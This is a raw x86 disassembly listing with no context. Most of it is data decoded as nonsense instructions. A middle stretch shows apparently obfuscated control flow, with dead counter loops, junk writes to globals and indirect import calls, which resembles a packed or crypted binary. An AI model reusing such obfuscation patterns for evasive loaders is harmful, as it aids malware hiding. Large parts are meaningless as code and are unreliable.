  4161ce:	dec    eax
  4161cf:	call   DWORD PTR [ebp+ebx*4-0x5b0ac20a]
  4161d6:	popf   
  4161d7:	(bad)  
  4161d9:	dec    ebx
  4161da:	cmp    BYTE PTR [eax-0x16],dl
  4161dd:	inc    ebp
  4161de:	enter  0x2040,0xa3
  4161e2:	fld    st(1)
  4161e4:	mov    eax,0xabd20245
  4161e9:	retf   
  4161ea:	xchg   DWORD PTR [ebx],ecx
  4161ec:	rol    BYTE PTR [eax],cl
  4161ee:	pop    ecx
  4161ef:	xchg   ecx,eax
  4161f0:	xor    bh,BYTE PTR [ebp+ecx*4+0x4f]
  4161f4:	stos   DWORD PTR es:[edi],eax
  4161f5:	add    DWORD PTR [ecx+0x67],esi
  4161f8:	fld    TBYTE PTR [esi]
  4161fa:	lods   eax,DWORD PTR ds:[esi]
  4161fb:	push   edx
  4161fc:	sbb    al,0xf8
  4161fe:	lea    ebx,[ebx]
  416200:	cli    
  416201:	das    
  416202:	cmp    DWORD PTR ds:0x61c2619e,ebp
  416208:	inc    edx
  416209:	jmp    0x878ca212
  41620e:	adc    al,0x1f
  416210:	jp     0x416210
  416212:	dec    esp
  416213:	call   0xe9a82eb2
  416218:	push   esi
  41621a:	pusha  
  41621b:	pusha  
  41621c:	fist   WORD PTR [esi+0x12]
  41621f:	out    0xe0,eax
  416221:	ret    0xacee
  416224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416225:	addr16 into 
  416227:	pop    DWORD PTR [ebp-0x72d0b85a]
  41622d:	icebp  
  41622e:	jp     0x4161da
  416230:	loop   0x4161c1
  416232:	(bad)  
  416233:	cli    
  416234:	add    ah,dl
  416236:	popa   
  416237:	js     0x416285
  416239:	push   esi
  41623a:	mov    ah,0x2a
  41623c:	int3   
  41623d:	and    BYTE PTR [ebp-0x6b],bh
  416240:	retf   0xbcc3
  416243:	mov    ebp,0xaa4c8bad
  416248:	sbb    al,0x14
  41624a:	(bad)  
  41624b:	mov    ebx,0x165f3040
  416250:	pop    es
  416251:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416252:	mov    bl,0xab
  416254:	cmp    ebx,DWORD PTR [esi-0x46]
  416257:	repz sbb BYTE PTR [eax],al
  41625a:	or     eax,eax
  41625c:	xor    eax,0x2b1e13f
  416261:	jb     0x416262
  416263:	mov    edx,0x1e1dff2f
  416268:	or     DWORD PTR [esi+eax*4-0x1d8bb52b],0x4b2e4931
  416273:	push   ds
  416274:	or     DWORD PTR [eax+0x17],edx
  416277:	mov    esp,DWORD PTR ds:0xd59cfa41
  41627d:	call   0xe0e775cf
  416282:	sbb    BYTE PTR [ecx+0x73],cl
  416285:	mov    ds:0xe43c3900,al
  41628a:	inc    edi
  41628b:	push   edx
  41628c:	pop    esi
  41628d:	mov    esp,0xa1ca0ab3
  416292:	ins    BYTE PTR es:[edi],dx
  416293:	xor    BYTE PTR [ecx+0x3326681c],cl
  416299:	in     eax,0xb1
  41629b:	mov    ah,0x63
  41629d:	inc    ebp
  41629e:	(bad)  
  41629f:	mov    al,0xd3
  4162a1:	shl    BYTE PTR [ebx],cl
  4162a3:	fs aam 0x79
  4162a6:	mov    ecx,0xf124e3d1
  4162ab:	loopne 0x4162b9
  4162ad:	pop    es
  4162ae:	mov    ah,0x15
  4162b0:	rcr    BYTE PTR [esi-0x36],1
  4162b3:	push   edi
  4162b4:	outs   dx,BYTE PTR ds:[esi]
  4162b5:	icebp  
  4162b6:	jge    0x41623a
  4162b8:	mov    bh,0x4a
  4162ba:	pushf  
  4162bb:	sub    al,0x2
  4162bd:	outs   dx,BYTE PTR ds:[esi]
  4162be:	dec    ecx
  4162bf:	out    0x4f,eax
  4162c1:	cmp    cl,BYTE PTR [edi]
  4162c3:	mov    dh,0x91
  4162c5:	xchg   DWORD PTR [edi],ecx
  4162c7:	pop    es
  4162c8:	ds inc edx
  4162ca:	repz ss inc ecx
  4162cd:	inc    ecx
  4162ce:	and    eax,eax
  4162d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162d2:	ret    0x7934
  4162d5:	jmp    0x6494f317
  4162da:	sbb    eax,0x6306e4e3
  4162df:	cmp    bl,cl
  4162e1:	sub    DWORD PTR ds:[esi+0x363289aa],edi
  4162e8:	jmp    0x41631d
  4162ea:	and    dh,bh
  4162ec:	add    BYTE PTR [ebx+0x5eed62c],ah
  4162f2:	sub    eax,0xea752485
  4162f7:	lds    ebx,FWORD PTR ss:[edx-0x70]
  4162fb:	push   edx
  4162fc:	popf   
  4162fd:	inc    esi
  4162fe:	outs   dx,BYTE PTR ds:[esi]
  4162ff:	push   ss
  416300:	xchg   esp,eax
  416301:	in     eax,0x73
  416303:	xchg   ebp,eax
  416304:	enter  0xe15e,0x39
  416308:	in     eax,dx
  416309:	fisttp WORD PTR [ebx]
  41630b:	fwait
  41630c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41630d:	sub    DWORD PTR [di],0x1a
  416311:	sub    al,0xf9
  416313:	loop   0x416388
  416315:	and    BYTE PTR [ebx+0x63a841f4],dh
  41631b:	das    
  41631c:	sub    bl,BYTE PTR [edx]
  41631e:	dec    edx
  41631f:	mov    edx,DWORD PTR [edi+0x76908de5]
  416325:	mov    ?,WORD PTR [ecx+eax*1-0x78]
  416329:	inc    ebx
  41632a:	mov    edi,0x4aa62e41
  41632f:	xor    BYTE PTR ds:0x23bbc9a2,0xa5
  416336:	lahf   
  416337:	jmp    0x3115:0xd69022f5
  41633e:	sub    DWORD PTR [ebx-0x1c],0x2897d629
  416345:	mov    bh,0x76
  416347:	and    eax,0x63f7d964
  41634c:	and    esp,DWORD PTR [edi+0x35e21ec7]
  416352:	and    esp,edi
  416354:	lods   eax,DWORD PTR ds:[esi]
  416355:	inc    esi
  416356:	push   ds
  416357:	shl    dh,cl
  416359:	sbb    eax,0x6b0c8035
  41635e:	loope  0x4162e4
  416360:	dec    esi
  416361:	out    0x4b,al
  416363:	or     esi,ecx
  416365:	div    BYTE PTR [eax+0x66]
  416368:	add    ecx,eax
  41636a:	add    BYTE PTR [ecx-0x239fee28],cl
  416370:	je     0x41630a
  416372:	mov    edx,0xe6d2e106
  416377:	ficom  WORD PTR [ecx+0x79]
  41637a:	cmp    ebx,eax
  41637c:	jg     0x41634f
  41637e:	push   eax
  41637f:	(bad)  
  416380:	je     0x4163f7
  416382:	cld    
  416383:	sub    edi,DWORD PTR [ebx+0xdbdbb39]
  416389:	add    ecx,DWORD PTR [ebp-0xa995899]
  41638f:	and    ecx,esp
  416391:	mov    ch,0xbc
  416393:	das    
  416394:	icebp  
  416395:	pop    edx
  416396:	in     eax,0x5f
  416398:	and    cl,BYTE PTR [esi]
  41639a:	stos   DWORD PTR es:[edi],eax
  41639b:	mov    esi,0xb43f2420
  4163a0:	outs   dx,DWORD PTR ds:[esi]
  4163a1:	add    eax,0x64b8ef2e
  4163a6:	inc    ecx
  4163a7:	jo     0x416401
  4163a9:	cmc    
  4163aa:	in     al,0x6a
  4163ac:	mov    edx,0x6645e7d1
  4163b1:	ds and ebx,ebx
  4163b4:	mov    al,0xa0
  4163b6:	test   eax,0x745310c
  4163bb:	(bad)  
  4163bd:	inc    esp
  4163be:	jnp    0x416360
  4163c0:	mov    eax,ecx
  4163c2:	jno    0x4163ed
  4163c4:	push   ds
  4163c5:	leave  
  4163c6:	mov    esp,edx
  4163c8:	aam    0x30
  4163ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163cc:	push   es
  4163cd:	mov    WORD PTR [edx],fs
  4163cf:	add    esi,eax
  4163d1:	jbe    0x416371
  4163d3:	xchg   ebp,eax
  4163d4:	ret    
  4163d5:	lahf   
  4163d6:	pop    esi
  4163d7:	xor    eax,0x23750267
  4163dc:	dec    eax
  4163dd:	inc    eax
  4163de:	jg     0x4163a8
  4163e0:	mov    eax,ds:0xd30cc8bd
  4163e5:	xchg   esi,eax
  4163e6:	dec    esi
  4163e7:	icebp  
  4163e8:	or     eax,0x62fcb12
  4163ed:	loopne 0x4163ae
  4163ef:	xor    al,0xb4
  4163f1:	rol    bl,1
  4163f3:	imul   esp,edx,0x13
  4163f6:	inc    edx
  4163f7:	jp     0x4163ca
  4163f9:	mov    BYTE PTR [ebx+0x3a],dh
  4163fc:	aas    
  4163fd:	sbb    eax,0x35117b9a
  416402:	mov    ch,0x17
  416404:	test   eax,0x8f8248fd
  416409:	or     eax,DWORD PTR [ecx-0x2f]
  41640c:	jp     0x416409
  41640e:	add    DWORD PTR [ebx+0x72834e0a],esp
  416414:	pusha  
  416415:	xchg   esi,eax
  416416:	rcr    BYTE PTR [ebx],cl
  416418:	xchg   esp,eax
  416419:	sbb    dl,al
  41641b:	in     al,dx
  41641c:	pop    ebp
  41641d:	mov    cl,0x62
  41641f:	test   DWORD PTR [ecx+ebp*8+0x61],esi
  416423:	mov    ecx,0xcabe9b32
  416428:	dec    esi
  416429:	inc    BYTE PTR [ebx-0x7732abe8]
  41642f:	int    0x37
  416431:	add    al,0xc5
  416433:	fld    QWORD PTR ds:[eax]
  416436:	rcl    DWORD PTR [edi-0x72fa7c49],1
  41643c:	cmp    DWORD PTR [ebp+ecx*4-0x180a3170],esp
  416443:	mov    bh,0xca
  416445:	imul   ebp,DWORD PTR [esi+0x2f],0xffffffe5
  416449:	mov    esp,DWORD PTR [eax+0x4b]
  41644c:	xchg   ebx,eax
  41644d:	pop    ds
  41644e:	push   edx
  41644f:	pop    edi
  416450:	push   esp
  416451:	ror    DWORD PTR [edx],1
  416453:	inc    esi
  416454:	sbb    ebx,DWORD PTR [esi-0x7839c9f7]
  41645a:	loop   0x416406
  41645c:	fdiv   st(1),st
  41645e:	push   esi
  41645f:	pop    es
  416460:	ret    0xeeff
  416463:	(bad)  
  416464:	aas    
  416465:	(bad)  
  416466:	jmp    0x9ef147d0
  41646b:	pop    esi
  41646c:	(bad)  
  41646d:	in     eax,0x5a
  41646f:	(bad)  
  416470:	jbe    0x416473
  416472:	ins    DWORD PTR es:[edi],dx
  416473:	add    DWORD PTR [edx+0x61bddd40],ecx
  416479:	popf   
  41647a:	shl    bh,0xa9
  41647d:	adc    al,0x8a
  41647f:	mov    esp,0xd33b13ed
  416484:	jo     0x4164dc
  416486:	jle    0x416483
  416488:	xchg   ebp,eax
  416489:	imul   esi,DWORD PTR [ebx-0x71],0x0
  41648d:	mov    bh,0x4d
  41648f:	add    al,0x80
  416491:	adc    ah,bl
  416493:	hlt    
  416494:	push   ebx
  416495:	sbb    dh,BYTE PTR [edi+ebx*4+0x52ed6a47]
  41649c:	mov    ds:0x8a097c4,al
  4164a1:	adc    ebp,DWORD PTR [ebp-0x21]
  4164a4:	xchg   edi,eax
  4164a5:	ja     0x41645b
  4164a7:	out    dx,al
  4164a8:	test   eax,0x742127ac
  4164ad:	or     ch,BYTE PTR [edi]
  4164af:	cs dec esi
  4164b1:	nop
  4164b2:	clc    
  4164b3:	stos   BYTE PTR es:[edi],al
  4164b4:	imul   esp,esi,0xffffffe6
  4164b7:	out    dx,eax
  4164b8:	pop    ecx
  4164b9:	sbb    eax,0xc535849f
  4164be:	es loop 0x4164e5
  4164c1:	sbb    al,0x11
  4164c3:	stc    
  4164c4:	xor    ebp,DWORD PTR [ecx]
  4164c6:	stos   BYTE PTR es:[edi],al
  4164c7:	or     dl,ch
  4164c9:	ret    0x2ab7
  4164cc:	addr16 test eax,0x4045019b
  4164d2:	lods   al,BYTE PTR ds:[esi]
  4164d3:	enter  0xafab,0xcb
  4164d7:	mov    ebp,0x8cd6de20
  4164dc:	pop    ecx
  4164dd:	cmp    DWORD PTR [ebx-0x707821d7],ecx
  4164e3:	mov    eax,ds:0x16819586
  4164e8:	ja     0x4164cd
  4164ea:	lds    esi,FWORD PTR [eax+eiz*8+0x652fb282]
  4164f1:	es cmp al,0xd4
  4164f4:	sbb    DWORD PTR [ecx],esp
  4164f6:	aaa    
  4164f7:	repnz mov WORD PTR [edi+eax*8],ss
  4164fb:	push   edi
  4164fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164fd:	(bad)  
  4164fe:	nop
  4164ff:	add    al,0x23
  416501:	fistp  QWORD PTR [esi-0x22]
  416504:	idiv   BYTE PTR [esi-0x3]
  416507:	in     eax,0xe0
  416509:	push   ecx
  41650a:	mov    cl,0xe9
  41650c:	lea    esp,[eax]
  41650e:	icebp  
  41650f:	scas   eax,DWORD PTR es:[edi]
  416510:	or     DWORD PTR [edi],ebp
  416512:	pusha  
  416513:	aad    0xab
  416515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416516:	popf   
  416517:	mov    edi,0x797ec463
  41651c:	scas   al,BYTE PTR es:[edi]
  41651d:	call   0x4204:0x92e7d57d
  416524:	loop   0x41657a
  416526:	mov    esp,0x88367589
  41652b:	cli    
  41652c:	sbb    eax,0x7e603e19
  416531:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416532:	retf   
  416533:	mov    esi,0x2897a8
  416538:	xor    bl,dl
  41653a:	sub    DWORD PTR [ecx-0x21],ebx
  41653d:	and    DWORD PTR ds:0x5af221f6,edi
  416543:	movzx  ecx,WORD PTR [ecx+edx*4]
  416547:	xor    DWORD PTR ds:0x428ea7,0x428e77
  416551:	xor    ecx,0x8a9b
  416557:	mov    DWORD PTR ds:0x428ea3,0x5f74
  416561:	add    ecx,edi
  416563:	mov    edi,DWORD PTR [ebp-0xc]
  416566:	mov    DWORD PTR ds:0x428e73,0x23ca
  416570:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  416577:	inc    edx
  416578:	mov    ecx,DWORD PTR [ebp-0x10]
  41657b:	mov    DWORD PTR ds:0x428e37,0x4a6a
  416585:	cmp    edx,ecx
  416587:	mov    DWORD PTR ds:0x428e73,0x3902
  416591:	jne    0x414140
  416597:	mov    ecx,DWORD PTR [ebp-0x18]
  41659a:	mov    DWORD PTR ds:0x428ebf,0x19
  4165a4:	cmp    DWORD PTR ds:0x428ebf,0x0
  4165ab:	je     0x4165e3
  4165b1:	cmp    DWORD PTR ds:0x428ebf,0x1d
  4165b8:	jle    0x4165e3
  4165be:	jmp    0x4165d1
  4165c3:	push   DWORD PTR [ebp-0x14]
  4165c6:	push   0x8b92
  4165cb:	call   DWORD PTR ds:0x42aa33
  4165d1:	mov    edx,DWORD PTR ds:0x428ebf
  4165d7:	dec    edx
  4165d8:	mov    DWORD PTR ds:0x428ebf,edx
  4165de:	jmp    0x4165a4
  4165e3:	mov    edx,DWORD PTR [ebp+0x10]
  4165e6:	and    DWORD PTR ds:0x428e83,0x0
  4165f0:	mov    edi,DWORD PTR ds:0x428e83
  4165f6:	inc    edi
  4165f7:	mov    DWORD PTR ds:0x428e83,edi
  4165fd:	cmp    DWORD PTR ds:0x428e83,0x2c
  416604:	jg     0x416627
  41660a:	jmp    0x41661a
  41660f:	push   0x428e8f
  416614:	call   DWORD PTR ds:0x42aa37
  41661a:	cmp    DWORD PTR ds:0x428e83,0x1e
  416621:	jb     0x4165f0
  416627:	xor    ecx,eax
  416629:	add    DWORD PTR ds:0x428e97,edx
  41662f:	add    ecx,esi
  416631:	xor    DWORD PTR ds:0x428e57,edx
  416637:	mov    DWORD PTR [edx],ecx
  416639:	sbb    edi,ecx
  41663b:	mov    ecx,DWORD PTR [ebp-0x18]
  41663e:	xor    DWORD PTR ds:0x428ec7,ebx
  416644:	xor    ecx,eax
  416646:	add    ecx,esi
  416648:	mov    DWORD PTR ds:0x428ebb,0x1e
  416652:	cmp    DWORD PTR ds:0x428ebb,0x0
  416659:	je     0x4166a8
  41665f:	cmp    DWORD PTR ds:0x428ebb,0x2
  416666:	jbe    0x4166a8
  41666c:	jmp    0x41667c
  416671:	push   0x71f6
  416676:	call   DWORD PTR ds:0x42aa3b
  41667c:	cmp    DWORD PTR ds:0x428ebb,0x3
  416683:	jne    0x416696
  416689:	mov    edi,DWORD PTR ds:0x428ebb
  41668f:	dec    edi
  416690:	mov    DWORD PTR ds:0x428ebb,edi
  416696:	mov    edi,DWORD PTR ds:0x428ebb
  41669c:	dec    edi
  41669d:	mov    DWORD PTR ds:0x428ebb,edi
  4166a3:	jmp    0x416652
  4166a8:	mov    DWORD PTR [ebp-0xc],ecx
  4166ab:	sbb    DWORD PTR ds:0x428eab,0x39c1
  4166b5:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4166bc:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4166c3:	sbb    edi,ecx
  4166c5:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4166cc:	mov    DWORD PTR ds:0x428e6f,0x17
  4166d6:	cmp    DWORD PTR ds:0x428e6f,0x0
  4166dd:	je     0x41671c
  4166e3:	cmp    DWORD PTR ds:0x428e6f,0x23
  4166ea:	jl     0x41671c
  4166f0:	jmp    0x41670a
  4166f5:	push   0x4cf4
  4166fa:	push   0x428e23
  4166ff:	push   0x15e1
  416704:	call   DWORD PTR ds:0x42aa3f
  41670a:	mov    edi,DWORD PTR ds:0x428e6f
  416710:	dec    edi
  416711:	mov    DWORD PTR ds:0x428e6f,edi
  416717:	jmp    0x4166d6
  41671c:	mov    ecx,DWORD PTR [ebp-0x14]
  41671f:	add    edi,DWORD PTR ds:0x428e3f
  416725:	mov    DWORD PTR [ebp+0x8],ecx
  416728:	sub    edi,0x632b
  41672e:	mov    ecx,DWORD PTR [ebp+0x8]
  416731:	xor    DWORD PTR ds:0x428e53,edi
  416737:	xor    ecx,eax
  416739:	mov    edi,DWORD PTR ds:0x428e9b
  41673f:	adc    DWORD PTR ds:0x428ebb,edi
  416745:	add    ecx,esi
  416747:	mov    edi,DWORD PTR ds:0x428e43
  41674d:	mov    ecx,0x242ebf1
  416752:	mov    edi,0xf641bf2
  416757:	mov    DWORD PTR ds:0x428e77,0x250d
  416761:	je     0x4191f8
  416767:	mov    edx,DWORD PTR [ebp+0x8]
  41676a:	mov    ebx,DWORD PTR [ebp-0x8]
  41676d:	neg    DWORD PTR ds:0x428e8f
  416773:	xor    edx,eax
  416775:	xor    ebx,eax
  416777:	sub    edx,ebx
  416779:	xor    DWORD PTR ds:0x428e63,edx
  41677f:	sub    edx,esi
  416781:	add    DWORD PTR ds:0x428eaf,0x644f
  41678b:	xor    edx,eax
  41678d:	or     DWORD PTR ds:0x428e27,0x4378
  416797:	mov    DWORD PTR [ebp+0x8],edx
  41679a:	and    DWORD PTR ds:0x428e67,0x0
  4167a4:	mov    edx,DWORD PTR ds:0x428e67
  4167aa:	inc    edx
  4167ab:	mov    DWORD PTR ds:0x428e67,edx
  4167b1:	cmp    DWORD PTR ds:0x428e67,0xe
  4167b8:	jl     0x4167f7
  4167be:	jmp    0x4167ce
  4167c3:	push   0x428111
  4167c8:	call   DWORD PTR ds:0x42aa0b
  4167ce:	cmp    DWORD PTR ds:0x428e67,0xd
  4167d5:	jne    0x4167ea
  4167db:	xor    edx,edx
  4167dd:	xor    edx,DWORD PTR ds:0x428e67
  4167e3:	inc    edx
  4167e4:	mov    DWORD PTR ds:0x428e67,edx
  4167ea:	cmp    DWORD PTR ds:0x428e67,0x1e
  4167f1:	jb     0x4167a4
  4167f7:	mov    edx,DWORD PTR [ebp+0x8]
  4167fa:	mov    ebx,DWORD PTR [ebp-0x58]
  4167fd:	adc    DWORD PTR ds:0x428eaf,0x428e9b
  416807:	add    edx,0x5708e4
  41680d:	imul   edx,ebx
  416810:	mov    ebx,DWORD PTR ds:0x428e87
  416816:	or     DWORD PTR ds:0x428e57,ebx
  41681c:	mov    DWORD PTR [ebp-0x58],edx
  41681f:	mov    edx,DWORD PTR ds:0x42974f
  416825:	mov    ebx,DWORD PTR ds:0x429bcf
  41682b:	sub    ebx,edx
  41682d:	xor    edx,DWORD PTR [edx+ebx*1]
  416830:	mov    edx,DWORD PTR [ebp+0x8]
  416833:	mov    ebx,DWORD PTR [ebp-0x54]
  416836:	xor    DWORD PTR ds:0x428e5b,0x428e83
  416840:	add    edx,0x64f882
  416846:	and    DWORD PTR ds:0x428eab,0x41a4
  416850:	or     edx,ebx
  416852:	and    DWORD PTR ds:0x428e53,0x0
  41685c:	mov    ebx,DWORD PTR ds:0x428e53
  416862:	inc    ebx
  416863:	mov    DWORD PTR ds:0x428e53,ebx
  416869:	cmp    DWORD PTR ds:0x428e53,0x1d
  416870:	ja     0x416893
  416876:	jmp    0x416886
  41687b:	push   0x42815b
  416880:	call   DWORD PTR ds:0x42aa0f
  416886:	cmp    DWORD PTR ds:0x428e53,0x11
  41688d:	jb     0x41685c
  416893:	mov    DWORD PTR [ebp-0x54],edx
  416896:	mov    DWORD PTR ds:0x428e83,0x1e
  4168a0:	cmp    DWORD PTR ds:0x428e83,0x0
  4168a7:	je     0x4168f8
  4168ad:	cmp    DWORD PTR ds:0x428e83,0xe
  4168b4:	jb     0x4168f8
  4168ba:	jmp    0x4168ca
  4168bf:	push   0x8096
  4168c4:	call   DWORD PTR ds:0x42aa13
  4168ca:	cmp    DWORD PTR ds:0x428e83,0xf
  4168d1:	jne    0x4168e6
  4168d7:	xor    edx,edx
  4168d9:	add    edx,DWORD PTR ds:0x428e83
  4168df:	dec    edx
  4168e0:	mov    DWORD PTR ds:0x428e83,edx
  4168e6:	mov    edx,DWORD PTR ds:0x428e83
  4168ec:	dec    edx
  4168ed:	mov    DWORD PTR ds:0x428e83,edx
  4168f3:	jmp    0x4168a0
  4168f8:	mov    edx,DWORD PTR [ebp+0x8]
  4168fb:	mov    ebx,DWORD PTR [ebp-0x50]
  4168fe:	sub    DWORD PTR ds:0x428e8b,0x428e67
  416908:	add    edx,ecx
  41690a:	xor    edx,ebx
  41690c:	xor    DWORD PTR ds:0x428e73,0x75fe
  416916:	mov    DWORD PTR [ebp-0x50],edx
  416919:	sbb    DWORD PTR ds:0x428eaf,0x1c33
  416923:	mov    edx,DWORD PTR [ebp+0x8]
  416926:	adc    DWORD PTR ds:0x428e4b,edx
  41692c:	mov    ebx,DWORD PTR [ebp-0x4c]
  41692f:	sbb    DWORD PTR ds:0x428e73,0x359
  416939:	add    edx,edi
  41693b:	add    DWORD PTR ds:0x428e33,0x428e43
  416945:	and    edx,ebx
  416947:	movzx  ebx,WORD PTR ds:0x428e3b
  41694e:	xor    DWORD PTR ds:0x428eb7,ebx
  416954:	mov    DWORD PTR [ebp-0x4c],edx
  416957:	add    ebx,DWORD PTR ds:0x428ebf
  41695d:	mov    edx,DWORD PTR [ebp+0x8]
  416960:	or     ebx,DWORD PTR ds:0x428e33
  416966:	mov    ebx,DWORD PTR [ebp-0x48]
  416969:	lea    edx,[ebx+edx*1+0x241fcdf]
  416970:	xor    DWORD PTR ds:0x428eab,0x519b
  41697a:	mov    DWORD PTR [ebp-0x48],edx
  41697d:	mov    edx,DWORD PTR [ebp+0x8]
  416980:	and    DWORD PTR ds:0x428eab,0x0
  41698a:	jmp    0x41699e
  41698f:	xor    ebx,ebx
  416991:	or     ebx,DWORD PTR ds:0x428eab
  416997:	inc    ebx
  416998:	mov    DWORD PTR ds:0x428eab,ebx
  41699e:	cmp    DWORD PTR ds:0x428eab,0x1b
  4169a5:	jae    0x4169e7
  4169ab:	cmp    DWORD PTR ds:0x428eab,0xb
  4169b2:	jbe    0x4169e7
  4169b8:	jmp    0x4169c8
  4169bd:	push   0x42815b
  4169c2:	call   DWORD PTR ds:0x42aa1b
  4169c8:	cmp    DWORD PTR ds:0x428eab,0xa
  4169cf:	jne    0x4169e2
  4169d5:	mov    ebx,DWORD PTR ds:0x428eab
  4169db:	inc    ebx
  4169dc:	mov    DWORD PTR ds:0x428eab,ebx
  4169e2:	jmp    0x41698f
  4169e7:	mov    ebx,0xfa5e1522
  4169ec:	or     DWORD PTR ds:0x428e7b,0x3b15
  4169f6:	sub    ebx,edx
  4169f8:	add    ebx,DWORD PTR [ebp-0x44]
  4169fb:	mov    DWORD PTR [ebp-0x44],ebx
  4169fe:	mov    edx,DWORD PTR ds:0x428e8f
  416a04:	xor    edx,DWORD PTR ds:0x428e27
  416a0a:	mov    DWORD PTR ds:0x428e8f,edx
  416a10:	mov    edx,DWORD PTR [ebp+0x8]
  416a13:	xor    edx,eax
  416a15:	add    edx,esi
  416a17:	jne    0x416767
  416a1d:	mov    DWORD PTR ds:0x428ea3,0x25d2
  416a27:	jmp    0x4191f8
  416a2c:	mov    edx,DWORD PTR [ebp-0xc]
  416a2f:	xor    ebx,ebx
  416a31:	or     ebx,DWORD PTR ds:0x428ea3
  416a37:	xor    ebx,DWORD PTR ds:0x428ea7
  416a3d:	mov    DWORD PTR ds:0x428ea3,ebx
  416a43:	sub    edx,esi
  416a45:	xor    edx,eax
  416a47:	sbb    ebx,DWORD PTR ds:0x428e87
  416a4d:	mov    DWORD PTR [ebp-0x5c],edx
  416a50:	jmp    0x418e09
  416a55:	out    0xe2,al
  416a57:	dec    edx
  416a58:	mov    dl,0x46
  416a5a:	stos   BYTE PTR es:[edi],al
  416a5b:	xchg   BYTE PTR [esi+0x2de23c83],dl
  416a61:	or     ebp,ecx
  416a63:	dec    esp
  416a64:	cmp    cl,0x44
  416a67:	add    BYTE PTR [ebx-0x7c7c9f19],0x7a
  416a6e:	mov    bl,0xab
  416a70:	or     al,0xf4
  416a72:	sub    ch,BYTE PTR [esi+0x60]
  416a75:	pop    ebx
  416a76:	push   edx
  416a77:	cwde   
  416a78:	xlat   BYTE PTR ds:[ebx]
  416a79:	mov    ?,WORD PTR [ecx+0x2f]
  416a7c:	in     eax,0x1a
  416a7e:	and    cl,BYTE PTR [ebx]
  416a80:	data16 jmp 0x416a68
  416a83:	imul   ecx,DWORD PTR [esi+0x10178a5a],0x5b503114
  416a8d:	das    
  416a8e:	sti    
  416a8f:	pop    esi
  416a90:	pushf  
  416a91:	xchg   esi,eax
  416a92:	add    DWORD PTR [edi+ebp*1+0x41d1e8f5],eax
  416a99:	mov    DWORD PTR [eax+ecx*1-0x7c],ebp
  416a9d:	or     DWORD PTR [eax-0x67d2a188],edx
  416aa3:	xlat   BYTE PTR ds:[ebx]
  416aa4:	int    0x85
  416aa6:	popa   
  416aa7:	ins    BYTE PTR es:[edi],dx
  416aa8:	mov    dl,0xe1
  416aaa:	ss cli 
  416aac:	inc    esp
  416aad:	mov    bh,BYTE PTR [edi-0x33]
  416ab0:	mov    ecx,DWORD PTR [eax+esi*8]
  416ab3:	pop    ebx
  416ab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ab5:	inc    ebx
  416ab6:	add    al,0xe4
  416ab8:	sbb    edi,DWORD PTR [eax-0x3e]
  416abb:	loopne 0x416a69
  416abd:	adc    DWORD PTR [esi-0x2c048959],0xc00f0fe3
  416ac7:	mov    esp,edi
  416ac9:	adc    eax,0xaabf991d
  416ace:	cmp    dl,BYTE PTR [eax+0x76]
  416ad1:	stos   DWORD PTR es:[edi],eax
  416ad2:	jns    0x416a69
  416ad4:	xor    bl,BYTE PTR [ebp-0x4]
  416ad7:	cli    
  416ad8:	jg     0x416a68
  416ada:	inc    esi
  416adb:	push   esi
  416adc:	cmp    ebp,DWORD PTR [esi+0x26]
  416adf:	int    0xff
  416ae1:	and    esi,ecx
  416ae3:	das    
  416ae4:	test   al,0x4f
  416ae6:	inc    esp
  416ae7:	retf   0x987a
  416aea:	mov    gs,WORD PTR ss:[edx+0x72]
  416aee:	inc    esi
  416aef:	int3   
  416af0:	imul   edi,ebx,0xffffffb8
  416af3:	dec    ebp
  416af4:	div    BYTE PTR [edi]
  416af6:	aaa    
  416af7:	or     esp,esp
  416af9:	loop   0x416b47
  416afb:	inc    ebp
  416afc:	push   esi
  416afd:	mov    ecx,0x97fc1c9e
  416b02:	push   ss
  416b03:	inc    ebx
  416b04:	add    edx,DWORD PTR [ebx]
  416b06:	ds das 
  416b08:	and    dl,bh
  416b0a:	cwde   
  416b0b:	pushf  
  416b0c:	mov    ecx,0x114eb4fe
  416b11:	xchg   ecx,eax
  416b12:	pop    ecx
  416b13:	inc    eax
  416b14:	imul   esi,DWORD PTR [ebx+0x20],0xe3a1ef81
  416b1b:	pop    es
  416b1c:	and    bl,BYTE PTR [ebp+0x67033688]
  416b22:	shl    BYTE PTR [edx],cl
  416b24:	lods   al,BYTE PTR ds:[esi]
  416b25:	add    al,0x91
  416b27:	in     eax,0x2
  416b29:	add    bl,ch
  416b2b:	sbb    DWORD PTR [edx+edx*4],eax
  416b2e:	imul   eax,DWORD PTR [edi],0x22a94faf
  416b34:	or     al,0x56
  416b36:	jb     0x416b5a
  416b38:	pop    esp
  416b39:	xor    BYTE PTR [ecx],cl
  416b3b:	pop    edi
  416b3c:	les    edx,FWORD PTR [ebp-0x9]
  416b3f:	fsubr  DWORD PTR [edi]
  416b41:	jmp    0x801dd861
  416b46:	cmp    edi,eax
  416b48:	mov    bl,0xcd
  416b4a:	push   ebp
  416b4b:	les    esi,FWORD PTR [ecx]
  416b4d:	out    0x3e,eax
  416b4f:	dec    ebx
  416b50:	sbb    BYTE PTR [ecx-0x11],bh
  416b53:	in     eax,0x68
  416b55:	arpl   WORD PTR [ebx+ecx*4-0x2f],bp
  416b59:	ror    bh,cl
  416b5b:	(bad)  
  416b5c:	mov    esp,DWORD PTR [eax+0x72a780e7]
  416b62:	inc    edx
  416b63:	leave  
  416b64:	pop    ds
  416b65:	and    ch,bl
  416b67:	retf   0xf926
  416b6a:	push   ebp
  416b6b:	xchg   edi,eax
  416b6c:	adc    eax,DWORD PTR [edi-0x35]
  416b6f:	sub    eax,0x11b0286b
  416b74:	xor    BYTE PTR [esi+ebp*2+0x6da7470b],0x14
  416b7c:	out    0x32,al
